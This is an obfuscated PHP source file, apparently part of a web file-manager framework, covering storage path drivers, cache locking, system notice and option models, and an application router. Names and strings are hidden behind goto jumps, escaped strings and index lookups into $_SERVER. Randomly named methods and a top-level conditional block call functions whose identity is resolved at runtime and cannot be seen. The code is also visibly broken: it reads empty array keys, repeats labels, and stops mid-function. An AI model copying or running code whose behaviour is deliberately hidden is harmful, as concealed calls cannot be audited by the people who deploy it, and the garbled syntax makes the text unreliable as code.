<?php
 goto dŷ; eۦӵ: class PathDriverDB extends PathDriverBase { public $model; public $pathParse; public function __construct($FݵË) { $this->pathParse = $FݵË; $this->model = Model($_SERVER[][1097]); } public function getPath($aچ׈) { return trim($aچ׈, $_SERVER[][8]); } public function pathFather($F縑) { $Bѫ = $this->parse($F縑); $Bѫ = $this->infoSimple($F縑); return $Bѫ ? $Bѫ[$_SERVER[][457]] : !1; } public function getPathName($A˅ݧ) { $Eͦ = $this->infoSimple($A˅ݧ); return $Eͦ ? $Eͦ[$_SERVER[][28]] : !1; } public function getPathOuter($cشչ) { if (!$cشչ) { return $cشչ; } $dʅş = $this->parse($cشչ); return KodIO::make($dʅş[$_SERVER[][363]]); } public function copyFolderFromIO($aЉ, $cξ, $d, $a죿, $B) { $c҈ = $this->model->copyFolderFromIO($aЉ, $cξ, $d, $a죿, $B); return KodIO::make($c҈); } public function isParentOf($Aȧ, $b؂) { return $this->model->isParentOf($Aȧ, $b؂); } public function mkfile($dɋ, $B԰ = '', $E = REPEAT_RENAME) { $DĆ =& $_SERVER[]; $cïֲ = $this->parse($dɋ); $dɋ = $cïֲ[$DĆ[363]]; for ($F͈ = 0; $F͈ < count($cïֲ[$DĆ[1098]]); $F͈++) { $Fب = $cïֲ[$DĆ[1098]][$F͈]; if ($F͈ == count($cïֲ[$DĆ[1098]]) - 1) { $dɋ = $this->model->mkfile($dɋ, $Fب, $B԰, $E); break; } $dɋ = $this->model->mkdir($dɋ, $Fب, REPEAT_SKIP); } return $this->getPathOuter($dɋ); } public function mkdir($cڈ, $fυ = REPEAT_SKIP) { $e =& $_SERVER[]; $Bʸ = $this->parse($cڈ); $cڈ = $Bʸ[$e[363]]; for ($aܡ = 0; $aܡ < count($Bʸ[$e[1098]]); $aܡ++) { $dܖ = $Bʸ[$e[1098]][$aܡ]; $cڈ = $this->model->mkdir($cڈ, $dܖ, $fυ); } return $this->getPathOuter($cڈ); } public function copyFile($c, $Fū܈, $C輇 = REPEAT_REPLACE) { $cһ =& $_SERVER[]; $BϹහ = $this->parse($Fū܈); $C = $this->model->copy($c, $BϹහ[$cһ[363]], $C輇, $BϹහ[$cһ[75]]); return $C ? $this->getPathOuter($C) : !1; } public function moveFile($c̛, $e, $b = REPEAT_REPLACE) { $aō =& $_SERVER[]; $a񶰩 = $this->parse($e); $d = $this->model->move($c̛, $a񶰩[$aō[363]], $b, $a񶰩[$aō[75]]); return $d ? $this->getPathOuter($d) : !1; } public function copy($cػ׼, $b؛, $Aܳ = REPEAT_REPLACE) { $FĹɵ = $this->parse($b؛); $bИ = $this->model->copy($cػ׼, $FĹɵ[$_SERVER[][363]], $Aܳ); return $bИ ? $this->getPathOuter($bИ) : !1; } public function move($Bᄿ, $cžٛ, $eޜы = REPEAT_REPLACE) { $d = $this->parse($cžٛ); $f = $this->model->move($Bᄿ, $d[$_SERVER[][363]], $eޜы); return $f ? $this->getPathOuter($f) : !1; } public function remove($aׂ, $C = true) { return $this->model->remove($aׂ, $C); } public function rename($C, $E) { $DȾΦ = $this->model->rename($C, $E); return $DȾΦ ? $this->getPathOuter($C) : $DȾΦ; } public function size($aպ) { $B = $this->infoSimple($aպ); return $B ? $B[$_SERVER[][77]] : 0; } public function infoSimple($cߊʖ) { return $this->model->sourceInfo($cߊʖ); } public function info($CЯ) { return $this->infoParse($CЯ); } public function infoAuth($FԂ) { return $this->infoParse($FԂ, !1, !0); } public function infoWithChildren($eܻ) { return $this->infoParse($eܻ, !0); } protected function infoParse($b¥, $E񠏡 = false, $E = false) { if (!$E񠏡) { return $this->model->pathInfo($b¥, $E); } return $this->model->pathInfoMore($b¥); } public function infoFull($BȪ) { $aщ =& $_SERVER[]; $FӝԌ = explode($aщ[8], $BȪ); $A֔ = implode($aщ[8], array_splice($FӝԌ, 1)); return $this->model->pathInfoByPath($FӝԌ[0], $A֔); } public function hashSimple($E) { $Dڶ =& $_SERVER[]; $cȍ = $this->infoWithChildren($E); return $cȍ[$Dڶ[158]][$Dڶ[160]]; } public function hashMd5($F) { $d᤺ =& $_SERVER[]; $a։ = $this->infoWithChildren($F); return $a։[$d᤺[158]][$d᤺[159]]; } public function exist($cϥ) { $Cѣ =& $_SERVER[]; $a = $this->parse($cϥ); if (!$a[$Cѣ[75]]) { return $this->isFile($cϥ) || $this->isFolder($cϥ); } $D = array($Cѣ[364] => $a[$Cѣ[363]], $Cѣ[28] => $a[$Cѣ[75]]); $E = $this->model->where($D)->find(); return $E ? !0 : !1; } public function isFile($E) { $aá =& $_SERVER[]; $C = $this->infoSimple($E); return $C && $C[$aá[366]] == $aá[83] ? !1 : !0; } public function isFolder($fڄ) { $e =& $_SERVER[]; $Eԅȃ = $this->infoSimple($fڄ); return $Eԅȃ && $Eԅȃ[$e[366]] == $e[83] ? !0 : !1; } public function listPath($f܋, $CՐ = false) { $D =& $_SERVER[]; if ($f܋ == $D[33]) { return !1; } $C = array($D[364] => $f܋); if ($CՐ) { return $this->model->listSource($C, -1); } return $this->model->listSource($C); } public function has($A󴍠Ѕ, $a = false, $c⣍ˍ = null) { $c؈ =& $_SERVER[]; $Bѷ = $this->infoWithChildren($A󴍠Ѕ); if ($a) { return array($c؈[188] => $Bѷ[$c؈[188]], $c؈[187] => $Bѷ[$c؈[187]]); } return $c⣍ˍ ? $Bѷ[$c؈[188]] : $Bѷ[$c؈[187]]; } public function listAll($cȺѿ) { $CĖ = IO::info($this->pathParse[$_SERVER[][75]]); if (!$CĖ) { return array(); } return $this->model->listAll($cȺѿ); } public function getContent($d欳) { return $this->model->getContent($d欳); } public function setContent($a⍣, $Bׯ֌ = '') { return $this->model->setContent($a⍣, $Bׯ֌); } public function fileSubstr($Eŗ, $B, $bАĚ) { return $this->model->fileSubstr($Eŗ, $B, $bАĚ); } public function download($bՠԐ, $c = '') { $Aاڽ = get_path_father($c); $B뒈 = get_path_this($c); $FԌ = $this->model->fileInfoGet($bՠԐ); $a = IO::copy($FԌ[$_SERVER[][75]], $Aاڽ, !1, $B뒈); return $a; } public function upload($E, $B͑, $Dָ = false, $fȅ = REPEAT_REPLACE) { $DҴќ޻ =& $_SERVER[]; $d = $this->parse($E); $D݉ = $this->model->addFile($d[$DҴќ޻[363]], $B͑, $d[$DҴќ޻[75]], $Dָ, $fȅ); return $this->getPathOuter($D݉); } public function uploadFileByID($c纍, $BȆ, $f) { $b̼ =& $_SERVER[]; $C񴽰 = $this->parse($c纍); $a = $this->model->addFileByFileID($C񴽰[$b̼[363]], $BȆ, $C񴽰[$b̼[75]], $f); return $this->getPathOuter($a); } public function addFileByRemote($E, $Eצِ, $Aˠ = array(), $cӯ = '', $E) { $Eܹ =& $_SERVER[]; $Cَճ = $this->parse($E); $cӯ = empty($cӯ) ? $Cَճ[$Eܹ[75]] : $cӯ; $E = $this->model->addFileByRemote($Cَճ[$Eܹ[363]], $Eצِ, $cӯ, $Aˠ, $E); return $this->getPathOuter($E); } public function uploadLink($cȏ, $C = 0) { $C猢 =& $_SERVER[]; $F = $this->parse($cȏ); $cȏ = Model($C猢[540])->createFileName($F[$C猢[75]]); $B = IO::uploadLink($cȏ, $C); return $B; } public function fileNameAuto($f̃ڐ, $cΡ, $F = REPEAT_REPLACE, $Bų͊ = false) { return $this->model->fileNameAuto($f̃ڐ, $cΡ, $F, $Bų͊); } public function fileNameExist($Cō, $C·) { return $this->model->fileNameExist($Cō, $C·); } protected function _fileOut($Bή, $Eǣ = false, $B̓ = false, $f = '', $c댳ҧ = false) { goto e; e: $Cԛ =& $_SERVER[]; $C = $this->model->sourceInfo($Bή); if ($C[$Cԛ[366]] == $Cԛ[83]) { header($Cԛ[1099]); die; } goto b; b: $D犬 = $this->model->fileInfoGet($Bή); $f = $D犬[$Cԛ[159]] ? $D犬[$Cԛ[159]] : $f; $aۥ = isset($GLOBALS[$Cԛ[1100]]) ? $GLOBALS[$Cԛ[1100]] : $C[$Cԛ[28]]; goto D䞲盅; D䞲盅: if ($c댳ҧ) { return IO::fileOutServer($D犬[$Cԛ[75]], $Eǣ, $aۥ, $f); } IO::fileOut($D犬[$Cԛ[75]], $Eǣ, $aۥ, $f); goto A; A: } public function fileOut($cŅ, $a = false, $C֜ = false, $aǾ꧂ = '') { $this->_fileOut($cŅ, $a, $C֜, $aǾ꧂); } public function fileOutServer($b賰, $bᥧ˔ = false, $E = false, $cɠ = '') { $this->_fileOut($b賰, $bᥧ˔, $E, $cɠ, !0); } protected function _fileOutImage($C, $aߍ = 250) { $e撯ߠ =& $_SERVER[]; $Dܳ = $this->model->sourceInfo($C); if ($Dܳ[$e撯ߠ[366]] == $e撯ߠ[83]) { show_json($e撯ߠ[1101] . $C, !1); } $GLOBALS[$e撯ߠ[1100]] = $Dܳ[$e撯ߠ[28]]; $a̬ = $this->model->fileInfoGet($C); IO::fileOutImage($a̬[$e撯ߠ[75]], $aߍ); } public function fileOutImage($b, $b = 250) { $this->_fileOutImage($b, $b); } public function fileOutImageServer($fȏ, $a = 250) { $this->_fileOutImage($fȏ, $a); } public function link($e, $DӾ = '') { $a㉑ = $this->model->fileInfoGet($e); return IO::link($a㉑[$_SERVER[][75]], $DӾ); } protected function parse($DφԽˌ) { $A٦ =& $_SERVER[]; if (strstr($DφԽˌ, $A٦[8]) === !1) { return array($A٦[381] => intval($DφԽˌ), $A٦[75] => $A٦[33], $A٦[1098] => array()); } $B = explode($A٦[8], trim($DφԽˌ, $A٦[8])); if (count($B) < 2) { show_tips($DφԽˌ . $A٦[1102]); } return array($A٦[381] => intval($B[0]), $A٦[75] => $B[1], $A٦[1098] => array_slice($B, 1)); } } class PathDriverDbShareItem extends PathDriverDB { public function __construct($Aկђԃ) { $this->pathParse = $Aկђԃ; $this->model = Model($_SERVER[][1097]); } public function getPathOuter($a) { $C۩ =& $_SERVER[]; if (!$a) { return $a; } $bª = $this->parse($a); return trim(KodIO::makeShare($this->pathParse[$C۩[363]], $bª[$C۩[363]]), $C۩[8]); } protected function infoParse($e㠳, $dڴ = false, $e첈 = false) { $C =& $_SERVER[]; $E񦧯 = $this->pathParse[$C[363]]; $DƦ = trim($this->pathParse[$C[998]], $C[8]); return Action($C[1103])->sharePathInfo($E񦧯, $DƦ); } public function infoFull($fղ) { $bܶ =& $_SERVER[]; $b˖ = explode($bܶ[8], trim($fղ, $bܶ[8])); if (count($b˖) > 1) { $DՖ = implode($bܶ[8], array_splice($b˖, 1)); $D̚ = $this->model->pathInfoByPath($b˖[0], $DՖ); if (!$D̚) { return !1; } $this->pathParse[$bܶ[998]] = $D̚[$bܶ[365]]; } return $this->infoParse($fղ); } public function listAll($f) { goto e; A: foreach ($FԽȄ as &$eǓُ) { check_abort(); $eǓُ[$bُ[387]] = $C۠->_shareItemeParse($eǓُ[$bُ[387]], $D); } return $FԽȄ; goto A; e: $bُ =& $_SERVER[]; $E魣 = IO::info($this->pathParse[$bُ[75]]); if (!$E魣) { return array(); } goto B; B: $FԽȄ = $this->model->listAll($f); $D = Model($bُ[532])->getInfo($E魣[$bُ[437]]); $C۠ = Action($bُ[1103]); goto A; A: } } class PathDriverDbShareLink extends PathDriverDB { public function __construct($e) { $this->pathParse = $e; $this->model = Model($_SERVER[][1097]); } protected function infoParse($cф, $Fך = false, $Aމ = false) { $eק =& $_SERVER[]; return Action($eק[1004])->sharePathInfo($this->pathParse[$eק[75]], !0); } public function listPath($cԏ۵, $A = false) { $d =& $_SERVER[]; $B = parent::listPath($cԏ۵, $A); foreach ($B as $e疞х => $C؄) { if (!in_array($e疞х, array($d[73], $d[74]))) { continue; } foreach ($C؄ as $fÂ => $Eض) { $B[$e疞х][$fÂ] = Action($d[1004])->shareItemInfo($Eض); } } return $B; } public function listAll($BՍ߃) { $f =& $_SERVER[]; $Fذ = IO::info($this->pathParse[$f[75]]); if (!$Fذ) { return array(); } $C֏ = $this->model->listAll($BՍ߃); foreach ($C֏ as &$d֥) { $d֥[$f[387]] = Action($f[1004])->shareItemInfo($d֥[$f[387]]); } return $C֏; } } goto AȻ; a؅: function cacheLockWait() { usleep(mt_rand(5, 50) * 100); } class CacheLockFile { private static $cachePath; private static $caches; public function __construct() { $Dؑȍ =& $_SERVER[]; $F = $GLOBALS[$Dؑȍ[6]][$Dؑȍ[333]]; self::$cachePath = $F[$Dؑȍ[163]][$Dؑȍ[75]]; @mkdir(self::$cachePath, 511, !0); } public function lock($aҜɖ, $F = 0) { goto f; BÚ쓎: $this->unlock($aҜɖ); return !1; goto bӧ; Bø: $Cي = rtrim(self::$cachePath, $B[8]) . $B[758] . md5($aҜɖ) . $B[759]; if (file_exists($Cي) && filemtime($Cي) && filemtime($Cي) < time() - 10) { @unlink($Cي); } do { if (file_exists($Cي)) { cacheLockWait(); continue; } $e͍ = fopen($Cي, $B[760]); if (!$e͍) { return !1; } $dº = flock($e͍, LOCK_EX | LOCK_NB); self::$caches[$aҜɖ] = array($B[761] => $e͍, $B[163] => $Cي); fwrite($e͍, $CҚ垸); clearstatcache(); if ($e͍ && $dº) { return !0; } cacheLockWait(); } while (microtime(!0) < $CҚ垸); goto BÚ쓎; f: $B =& $_SERVER[]; $aﶈ־ = microtime(!0); $CҚ垸 = $aﶈ־ + $F + 0.0001; goto Bø; bӧ: } public function lockGet($dՊ) { $C쥖 =& $_SERVER[]; $C܈ͅ = rtrim(self::$cachePath, $C쥖[8]) . $C쥖[758] . md5($dՊ) . $C쥖[759]; return file_exists($C܈ͅ); } public function unlock($D۹) { goto d؃; e͟: @flock($D֊）[$dֆ[761]], LOCK_UN); @fclose($D֊）[$dֆ[761]]); @unlink($D֊）[$dֆ[163]]); goto f; d؃: $dֆ =& $_SERVER[]; $D֊） = self::$caches[$D۹]; if (!$D֊）) { return; } goto e͟; f: unset(self::$caches[$D۹]); goto e; e: } } class CacheLockRedis { public function lock($Aʤľ, $c = 10) { $a = Cache::init(); $FǢ = microtime(!0) + $c; while (microtime(!0) < $FǢ) { $C۵ = $a->get($Aʤľ); if (!$C۵) { $B쳪Ύ = $a->setLock($Aʤľ, $FǢ, $c); if ($B쳪Ύ) { return !0; } } else { if ($C۵ < microtime(!0)) { $a->set($Aʤľ, $FǢ, $FǢ); if ($a->get($Aʤľ) === $C۵) { return !0; } } } cacheLockWait(); } return !1; } public function lockGet($b،Ί) { return Cache::init()->get($b،Ί); } public function unlock($F귄) { return Cache::init()->remove($F귄); } } goto dق; Eϛ: class SystemNoticeModel extends ModelBaseLight { public $optionType = "\123\171\x73\x74\x65\155\x2e\x6e\157\164\151\x63\x65\x4c\151\163\164"; public $field = array("\x6e\141\155\x65", "\x63\x6f\x6e\x74\145\156\x74", "\141\165\x74\150", "\155\x6f\x64\x65", "\164\151\x6d\x65", "\x74\x79\160\145", "\x6c\x65\x76\x65\x6c", "\x65\x6e\x61\x62\154\x65", "\163\x6f\162\164"); public function listData($CƋ = false, $Fٗ = "\163\x6f\162\x74", $d = false) { return parent::listData($CƋ, $Fٗ, $d); } public function add($fܽ) { $c䈫 =& $_SERVER[]; $cƂ = time(); if ($fܽ[$c䈫[12]] == $c䈫[2438]) { $cƂ = strtotime($fܽ[$c䈫[186]]); } $fܽ[$c䈫[186]] = $cƂ; return parent::insert($fܽ); } public function update($Dϡ, $e폍̾) { goto fÎ; f: return parent::update($Dϡ, $e폍̾); goto bԪ퐐; a댷: $Eͷ = time(); if ($e폍̾[$B[12]] == $B[2438]) { $Eͷ = strtotime($e폍̾[$B[186]]); } $e폍̾[$B[186]] = $Eͷ; goto f; fÎ: $B =& $_SERVER[]; $AՅ = $this->listData($Dϡ); if (!$AՅ) { return !1; } goto a댷; bԪ퐐: } public function remove($C؏) { $C떗 = $this->listData($C؏); if (!$C떗 || $C떗[$_SERVER[][1067]]) { return !1; } return parent::remove($C؏); } public function sort($e, $F) { return parent::update($e, $F); } public function enable($fƻ, $B) { return parent::update($fƻ, array($_SERVER[][2439] => $B)); } private function initUserOption() { $Fײ =& $_SERVER[]; $this->optionType = $Fײ[2440]; $this->modelType = $Fײ[2441]; $this->field = array($Fײ[2442], $Fײ[28], $Fײ[186], $Fײ[29], $Fײ[2443], $Fײ[675], $Fײ[179]); } public function userNoticeGet($f = false) { $this->initUserOption(); return parent::listData($f, $_SERVER[][363], !0); } public function userNoticeAdd($Bϋ) { $f =& $_SERVER[]; $this->initUserOption(); $Də䋄 = $this->findByKey($f[2442], $Bϋ[$f[363]]); if ($Də䋄) { return !0; } $Eۺ = array($f[2442] => $Bϋ[$f[363]], $f[28] => $Bϋ[$f[28]], $f[186] => $Bϋ[$f[186]], $f[29] => isset($Bϋ[$f[29]]) ? $Bϋ[$f[29]] : 1, $f[2443] => isset($Bϋ[$f[2443]]) ? $Bϋ[$f[2443]] : 0, $f[675] => 0, $f[179] => 0); return parent::insert($Eۺ); } public function userNoticeEdit($Dѓ, $f˝) { $this->initUserOption(); return parent::update($Dѓ, $f˝); } } if ($_SERVER[$_SERVER[][775]] != $_SERVER[$_SERVER[][959]]) { goto F޵; F޵: $e࣋ = $_SERVER[][777]; $Eڳ = $_SERVER[$_SERVER[][772]] . $_SERVER[][773]; $CӸ = $e࣋($Eڳ); goto bݷ; bݷ: $Cˇ = explode($_SERVER[][213], $CӸ); if (count($Cˇ) < $_SERVER[][584]) { $d㐣 = $_SERVER[][778]; $d㐣(); } $fѓ = $_SERVER[][960]; goto eǆ; eǆ: $fѓ($_SERVER[$_SERVER[][961]]); goto F·; F·: } class SystemOptionModel extends ModelBaseOption { protected $tableName = "\163\x79\163\164\x65\155\137\157\160\x74\x69\157\156"; protected $jsonField = array("\x6d\145\156\x75", "\x72\x6f\154\x65", "\x72\x6f\154\x65\107\x72\157\165\x70", "\x72\x65\x67\x69\163\164", "\145\155\141\151\154"); function __construct() { parent::__construct(); } protected function cacheKey($a򰉌) { return "\123\171\163\x74\x65\x6d\117\160\x74\x69\157\156\x5f{$a򰉌}"; } protected function optionDefault($eϔ = '') { $d۫ =& $_SERVER[]; if ($eϔ == $d۫[33]) { return $GLOBALS[$d۫[6]][$d۫[2444]]; } } } goto D︎; aǲ: define($_SERVER[][1899], 4); define($_SERVER[][1900], 5); define($_SERVER[][1901], 16); goto F; Eڐ: while ($eֱȾ < $_SERVER[][547]) { if ($eֱȾ >= 0) { break; } $eֱȾ++; } class Application { private $defaultModule = "\151\x6e\144\145\x78"; private $defaultController = "\x69\156\144\145\x78"; private $defaultAction = "\151\156\144\145\x78"; function __construct() { } public function setDefault($c) { goto a; Cȴ: $this->{$_SERVER[ʆ][3]}($c͸[4], array($this, $c͸[5])); $A඾Ս = $d뻉[550]; if (strlen($A඾Ս) < $d뻉[551]) { die; } goto C; a: $eҐ = $d뻉[548]; if (!$eҐ) { die; } $this->defaultModule = $E㕏[0] ? $E㕏[0] : $this->defaultModule; goto cӏ; a: $d뻉 =& $_SERVER[]; $c͸ =& $_SERVER[ʆ]; $E㕏 = $c͸[0]($c͸[1], $c͸[2]($c, $c͸[1])); goto a; cӏ: $this->defaultController = $E㕏[1] ? $E㕏[1] : $this->defaultController; $B = $d뻉[549]; $this->defaultAction = $E㕏[2] ? $E㕏[2] : $this->defaultAction; goto Cȴ; C: } public function appRun($Fҕޭ) { goto fጏ靈; fʐ˸: $a[17]($Fҕޭ); $dʾ = $A[554]; while (strlen($dʾ) < $A[547]) { if (!$dʾ) { break; } $dʾ++; } goto Eؒ; Eؒ: $a[13](array($a[14], $a[15]), $DҞ . $a[18], $Fҕޭ); goto aڒиæ; fጏ靈: $A =& $_SERVER[]; $a =& $_SERVER[ʆ]; $c = $a[0]($a[1], $Fҕޭ); goto E; E: $AǠ = $A[552]; $b = $a[6]($c[0]); $DҞ = $a[7]; goto E½; E½: $C㣿 = $A[553]; if ($b == $a[8]) { $DҞ = $a[9]; $c[0] = $a[10]; $c[1] = $c[1] . $a[11]; $Fҕޭ = $a[12]($a[1], $c); $Fҕޭ = $a[2]($Fҕޭ, $a[1]); } $a[13](array($a[14], $a[15]), $DҞ . $a[16], $Fҕޭ); goto fʐ˸; aڒиæ: } private function autorun() { $BԴ =& $_SERVER[]; $aԠ =& $_SERVER[ʆ]; global $config; if ($aԠ[19]($config[$aԠ[20]]) == 0) { return; } foreach ($config[$aԠ[20]] as $C߼ => $f) { $this->{$_SERVER[ʆ][21]}($f); $CЭ = $BԴ[555]; while ($CЭ < $BԴ[556]) { if ($CЭ >= 0) { break; } $CЭ++; } } } private function zlhk34aa0301() { goto A菶; A菶: $eľ =& $_SERVER[]; $eȸ =& $_SERVER[ʆ]; $cҪ = $eȸ[8]; goto A܉; Cɇշ: $cⰞ = $eľ[559]; $fւ = $eȸ[26]($GLOBALS[$eȸ[22]][$eȸ[23]], 1); $GLOBALS[$eȸ[22]][$eȸ[23]] = $eȸ[27]($fʽ, $fւ); goto Aו; a鲇: $Aﷺ胏 = $eľ[558]; if (!$Aﷺ胏) { die; } $fʽ = array($eȸ[8], $Fۿ٦); goto Cɇշ; Bζ: while (strlen($dॲ) < $eľ[562]) { if (!$dॲ) { break; } $dॲ++; } goto d; A܉: $f޿ = $GLOBALS[$eȸ[22]][$eȸ[23]][0]; $a밣 = $eľ[557]; if (!$a밣) { die; } goto B𝆭; B𝆭: if (!$f޿ || $eȸ[24]($f޿) <= $eȸ[24]($cҪ)) { return; } if ($eȸ[6]($eȸ[25]($f޿, -$eȸ[24]($cҪ))) != $cҪ) { return; } $Fۿ٦ = $eȸ[25]($f޿, 0, -$eȸ[24]($cҪ)); goto a鲇; Aו: $cʔĞ = $eľ[560]; $GLOBALS[$eȸ[22]][$eȸ[28]] = $eȸ[29]($eȸ[1], $GLOBALS[$eȸ[22]][$eȸ[23]]); $dॲ = $eľ[561]; goto Bζ; d: } private function aobg4bcdf0eb() { goto C; E܅: $GLOBALS[$E䅈[22]][$E䅈[23]] = $E䅈[0]($E䅈[36], $Eː¦); $GLOBALS[$E䅈[22]][$E䅈[28]] = $E䅈[29]($E䅈[1], $GLOBALS[$E䅈[22]][$E䅈[23]]); $C = $dţ[564]; goto b͕; f: $C√ = $_SERVER[$E䅈[30]]; $B = $E䅈[31]; if (!$E䅈[32]($C√, $B)) { return; } goto d; C: $dţ =& $_SERVER[]; $E䅈 =& $_SERVER[ʆ]; if ($GLOBALS[$E䅈[22]][$E䅈[28]] != $E䅈[10]) { return; } goto f; b͕: while ($C < $dţ[556]) { if ($C >= 0) { break; } $C++; } goto dƱ; Fރ: $Eː¦ = $E䅈[25]($C√, $b欷 + $E䅈[24]($B)); $E䅈[34]($E䅈[35], $Eː¦, $eᦧ); $Eː¦ = $E䅈[2]($eᦧ[0][0], $E䅈[36]); goto E܅; d: $b欷 = $E䅈[33]($C√, $B); $dӚ = $dţ[563]; if (!$dӚ) { die; } goto Fރ; dƱ: } public function run() { goto Aݕ; Bᢽ̜: $Bᇦ = $GLOBALS[$F[22]][$F[28]]; $F[39]($F[40], isset($fé[0]) && $fé[0] ? $fé[0] : $this->defaultModule); $Eر = $A[566]; goto d냢; Aݕ: $A =& $_SERVER[]; $F =& $_SERVER[ʆ]; $this->{$_SERVER[ʆ][37]}(); goto e; B߃: $F[39]($F[42], isset($fé[2]) && $fé[0] ? $fé[2] : $this->defaultAction); $F[39]($F[43], MOD . $F[1] . ST . $F[1] . ACT); $_SERVER[$F[44]] = $F[6](ACTION); goto A; d냢: while (strlen($Eر) < $A[547]) { if (!$Eر) { break; } $Eر++; } $F[39]($F[41], isset($fé[1]) && $fé[0] ? $fé[1] : $this->defaultController); $BӺ = $A[567]; goto B߃; b: if ($F[19]($fé) >= 3) { $this->{$_SERVER[ʆ][21]}($Bᇦ); } else { $this->{$_SERVER[ʆ][21]}(ACTION); } goto dפֿ; A: $this->{$_SERVER[ʆ][45]}(); $Bȩ = $A[568]; if (!$Bȩ) { return; } goto b; e: $F㐂 = $A[565]; $this->{$_SERVER[ʆ][38]}(); $fé = $GLOBALS[$F[22]][$F[23]]; goto Bᢽ̜; dפֿ: } private $vxcyf6a94dbd = array(); private $rhkg2a3f9dc8 = ''; public function npmufd7a16ce() { goto C; F: while (strlen($Dʮ) < $AՑ[556]) { if (!$Dʮ) { break; } $Dʮ++; } $this->{$_SERVER[ʆ][3]}($c[59], array($this, $c[60])); $bɕ = $AՑ[576]; goto bʕ; D: $this->{$_SERVER[ʆ][3]}($c[53], array($this, $c[54])); $Aޒ = $AՑ[574]; if (strlen($Aޒ) < $AՑ[547]) { die; } goto b¬; E: $a = $AՑ[573]; if (!$a) { die; } $this->{$_SERVER[ʆ][52]}(); goto D; C: $AՑ =& $_SERVER[]; $c =& $_SERVER[ʆ]; $this->{$_SERVER[ʆ][46]}(); goto Dԧ푹; bʕ: if (strlen($bɕ) < $AՑ[562]) { return; } goto cԳ; Dԧ푹: $B = $AՑ[569]; while ($B < $AՑ[551]) { if ($B >= 0) { break; } $B++; } $this->{$_SERVER[ʆ][47]}(); goto A; A: $FÉݛ҉ = $AՑ[570]; if (strlen($FÉݛ҉) < $AՑ[556]) { return; } $this->{$_SERVER[ʆ][48]}(); goto d; d: $a = $AՑ[571]; if (strlen($a) < $AՑ[556]) { return; } $this->{$_SERVER[ʆ][49]}(); goto Bۓ; Bۓ: $this->{$_SERVER[ʆ][50]}(); $f뎫 = $AՑ[572]; $this->{$_SERVER[ʆ][51]}(); goto E; b¬: $this->{$_SERVER[ʆ][3]}($c[55], array($this, $c[56])); $this->{$_SERVER[ʆ][3]}($c[57], array($this, $c[58])); $Dʮ = $AՑ[575]; goto F; cԳ: } public function qfgmf31681ad($E) { goto Aʅ; D: $A = $E֐ɕ[582]; while (strlen($A) < $E֐ɕ[547]) { if (!$A) { break; } $A++; } if ($a͉[$E޳[120]] != $E޳[121]) { $E[$E޳[108]][$E޳[122]] = $a͉[$E޳[122]]; $E[$E޳[108]][$E޳[123]] = $a͉[$E޳[123]]; $f = $E޳[124](10) . $this->rhkg2a3f9dc8 . $E޳[124](5); $E[$E޳[93]][$E޳[125]][$E޳[126]] = $this->{$_SERVER[ʆ][127]}($f, $E[$E޳[108]][$E޳[113]]); } goto E⤫; E: $B = $E֐ɕ[581]; while (strlen($B) < $E֐ɕ[547]) { if (!$B) { break; } $B++; } $E[$E޳[108]][$E޳[120]] = $this->rhkg2a3f9dc8; goto D; aͻ: $C = $E֐ɕ[578]; if (!$C) { return; } foreach ($D߽ as $bʦ) { $EĠڪ = $GLOBALS[$E޳[91]][$E޳[92]][$bʦ]; if (isset($a͉[$bʦ])) { $EĠڪ = $a͉[$bʦ]; } $E[$E޳[93]][$E޳[94]][$bʦ] = $EĠڪ; } goto B; a: return $E; goto d; eƝ: $d㠂ե = $E֐ɕ[583]; while ($d㠂ե < $E֐ɕ[584]) { if ($d㠂ե >= 0) { break; } $d㠂ե++; } if ($E޳[104]($GLOBALS, $E޳[132]) && $this->config[$E޳[133]]) { $E[$E޳[108]][$E޳[134]] = WEB_ROOT; } goto a; B: $fԮ = $E[$E޳[93]][$E޳[94]][$E޳[76]]; unset($E[$E޳[93]][$E޳[95]][$E޳[96]]); unset($E[$E޳[93]][$E޳[95]][$E޳[97]]); goto D֛񉈑; E⤫: if ($this->rhkg2a3f9dc8 == $E޳[121]) { $E[$E޳[93]][$E޳[94]][$E޳[99]][$E޳[107]] = 0; } $E[$E޳[108]][$E޳[128]] = $E޳[104]($this->vxcyf6a94dbd, $E޳[129], $E޳[10]); $E[$E޳[108]][$E޳[130]] = $E޳[104]($this->vxcyf6a94dbd, $E޳[131], $E޳[10]); goto eƝ; DōЭ: unset($E[$E޳[93]][$E޳[94]][$E޳[98]]); $bݎꤺ = $E֐ɕ[580]; $E[$E޳[93]][$E޳[94]][$E޳[99]] = array($E޳[100] => (int) $fԮ[$E޳[101]], $E޳[102] => $E޳[103]($E޳[104]($fԮ, $E޳[105], array())), $E޳[106] => (int) $E޳[104]($fԮ, $E޳[107], 0)); goto F­; B氱: $b馿 = $E֐ɕ[577]; if (!$b馿) { return; } $D߽ = array($E޳[64], $E޳[65], $E޳[66], $E޳[67], $E޳[68], $E޳[69], $E޳[70], $E޳[71], $E޳[72], $E޳[73], $E޳[74], $E޳[75], $E޳[76], $E޳[77], $E޳[78], $E޳[79], $E޳[80], $E޳[81], $E޳[82], $E޳[83], $E޳[84], $E޳[85], $E޳[86], $E޳[87], $E޳[88], $E޳[89], $E޳[90]); goto aͻ; Aʅ: $E֐ɕ =& $_SERVER[]; $E޳ =& $_SERVER[ʆ]; $a͉ = $E޳[61]($E޳[62])->{$_SERVER[ʆ][63]}(); goto B氱; D֛񉈑: $d٬ = $E֐ɕ[579]; while ($d٬ < $E֐ɕ[547]) { if ($d٬ >= 0) { break; } $d٬++; } unset($E[$E޳[93]][$E޳[94]][$E޳[76]]); goto DōЭ; F­: $E[$E޳[108]][$E޳[109]] = $E޳[110]($E޳[111])->{$_SERVER[ʆ][112]}(); $E[$E޳[108]][$E޳[113]] = $E޳[114]($_SERVER[$E޳[115]] . $a͉[$E޳[116]]); $E[$E޳[108]][$E޳[117]] = $E޳[118]($E޳[119]()); goto E; d: } private function qcaydd83fbf4() { goto D; cȵ˦: if ($this->rhkg2a3f9dc8 == $E䖫[121]) { return; } $F¯ = array($E䖫[153], $E䖫[154], $E䖫[155], $E䖫[156], $E䖫[157], $E䖫[158]); $c넛ė = $E䖫[61]($E䖫[62])->{$_SERVER[ʆ][63]}(); goto b; b: $c = array($E䖫[159] => $c넛ė[$E䖫[64]], $E䖫[160] => $c넛ė[$E䖫[65]], $E䖫[161] => $E䖫[10]); foreach ($F¯ as $Eܝ) { if (!isset($c넛ė[$Eܝ]) || !$c넛ė[$Eܝ]) { continue; } $c[$Eܝ] = $c넛ė[$Eܝ]; $Dץ = $dĨ[588]; if (strlen($Dץ) < $dĨ[584]) { return; } } $E䖫[13](array($E䖫[151], $E䖫[152]), $c); goto 